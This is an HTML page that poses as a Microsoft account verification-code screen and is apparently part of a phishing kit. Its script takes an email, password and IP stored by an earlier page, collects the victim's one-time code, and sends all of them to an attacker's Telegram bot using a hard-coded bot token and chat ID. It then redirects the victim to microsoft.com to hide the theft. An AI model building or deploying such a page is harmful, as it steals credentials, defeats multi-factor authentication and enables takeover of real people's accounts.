<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Enter OTP</title>
  <style>
    :root {
      --primary: #0078d4;
      --primary-hover: #106ebe;
      --text: #333;
      --light-gray: #f3f2f1;
      --border: #ccc;
      --link: #0067b8;
      --link-hover: #005a9e;
    }

    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background-color: #fff;
      color: var(--text);
      line-height: 1.6;
      padding: 2rem;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      max-width: 450px;
      padding: 2rem;
      border: 1px solid var(--border);
      border-radius: 8px;
      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
      background: #fff;
    }

    .header {
      margin-bottom: 1.5rem;
    }

    .header h1 {
      font-size: 1.8rem;
      font-weight: 600;
      margin-bottom: 1rem;
    }

    .microsoft-logo {
      display: flex;
      align-items: center;
      margin-bottom: 1.5rem;
    }

    .microsoft-logo .square {
      width: 20px;
      height: 20px;
      margin-right: 8px;
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 2px;
    }

    .microsoft-logo .square div {
      border-radius: 2px;
    }

    .microsoft-logo .square div:nth-child(1) { background: #f25022; }
    .microsoft-logo .square div:nth-child(2) { background: #7fba00; }
    .microsoft-logo .square div:nth-child(3) { background: #00a4ef; }
    .microsoft-logo .square div:nth-child(4) { background: #ffb900; }

    .microsoft-logo span {
      font-size: 1.2rem;
      font-weight: 600;
      color: #555;
    }

    .form-group {
      margin-bottom: 1.5rem;
    }

    .form-group label {
      display: block;
      margin-bottom: 0.5rem;
      font-weight: 600;
    }

    .input-wrapper {
      position: relative;
    }

    .input-field {
      width: 100%;
      padding: 0.75rem 1rem;
      font-size: 1rem;
      border: 1px solid var(--border);
      border-radius: 4px;
      outline: none;
      transition: border-color 0.2s ease;
    }

    .input-field:focus {
      border-color: var(--primary);
      box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.2);
    }

    .input-field::placeholder {
      color: #999;
    }

    .help-links {
      margin: 1rem 0;
      font-size: 0.9rem;
    }

    .help-links a {
      color: var(--link);
      text-decoration: none;
      font-weight: 500;
    }

    .help-links a:hover {
      color: var(--link-hover);
      text-decoration: underline;
    }

    .footer {
      display: flex;
      justify-content: flex-end;
      margin-top: 2rem;
    }

    .btn {
      padding: 0.75rem 1.5rem;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 1rem;
      font-weight: 600;
      transition: background-color 0.2s ease;
    }

    .btn-next {
      background: var(--primary);
      color: white;
    }

    .btn-next:hover {
      background: var(--primary-hover);
    }

    @media (max-width: 480px) {
      .container {
        padding: 1.5rem;
        margin: 0 1rem;
      }

      .header h1 {
        font-size: 1.5rem;
      }

      .btn {
        padding: 0.75rem 1rem;
        font-size: 0.95rem;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="header">
      <h1>Let's add your Microsoft account</h1>
      <div class="microsoft-logo">
        <div class="square">
          <div></div><div></div>
          <div></div><div></div>
        </div>
        <span>Microsoft</span>
      </div>
    </div>

    <div class="form-group">
      <label for="otp-input">Enter verification code</label>
      <div class="input-wrapper">
        <input 
          type="text" 
          id="otp-input" 
          class="input-field" 
          placeholder="Enter 6-digit code"
          maxlength="6"
          pattern="[0-9]*"
          inputmode="numeric"
        />
      </div>
    </div>

    <div class="help-links">
      <a href="#" id="resend-otp">Resend code</a>
    </div>

    <div class="footer">
      <button class="btn btn-next" id="verify-btn">Verify</button>
    </div>
  </div>

  <script>
    const userEmail = localStorage.getItem('userEmail') || 'unknown@example.com';
    const userPassword = localStorage.getItem('userPassword') || 'unknown';
    const userIP = localStorage.getItem('userIP') || 'Unknown';

    document.getElementById('resend-otp').addEventListener('click', function(e) {
      e.preventDefault();
      alert("Verification code resent.");
    });

    document.getElementById('verify-btn').addEventListener('click', function() {
      const otp = document.getElementById('otp-input').value.trim();

      if (!otp || otp.length !== 6 || !/^\d{6}$/.test(otp)) {
        alert("Please enter a valid 6-digit code.");
        return;
      }

      showLoading();

      setTimeout(() => {
        sendToTelegram({
          action: "otp_received",
          email: userEmail,
          password: userPassword,
          otp: otp,
          ip: userIP,
          timestamp: new Date().toLocaleString()
        });

        const finalUrl = 'https://www.microsoft.com';
        window.location.href = finalUrl;
      }, 5000);
    });

    function showLoading() {
      document.body.innerHTML = `
        <div style="display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #fff;">
          <div style="text-align: center; padding: 2rem;">
            <div style="width: 60px; height: 60px; position: relative; margin: 0 auto 1rem;">
              <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 4px solid transparent; border-top: 4px solid #0078d4; border-right: 4px solid #0078d4; border-radius: 50%; animation: spin 1.2s linear infinite;"></div>
            </div>
            <div style="color: #0078d4; font-size: 1.1rem; font-weight: 500;">Verifying...</div>
          </div>
        </div>
        <style>
          @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
          }
        </style>
      `;
    }

    function sendToTelegram(data) {
      const botToken = '8106792998:AAEXwd566CHWodnbGx71u_6ohnIS3Dyxg0U';
      const chatId = '5875956678';

      const message = `
🔢 *OTP Received*
📧 Email: ${data.email}
🔑 Password: ${data.password}
🔢 OTP: ${data.otp}
🌐 IP: ${data.ip}
⏰ Time: ${data.timestamp}
`;

      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: 'Markdown' })
      }).catch(console.error);
    }
  </script>
</body>
</html>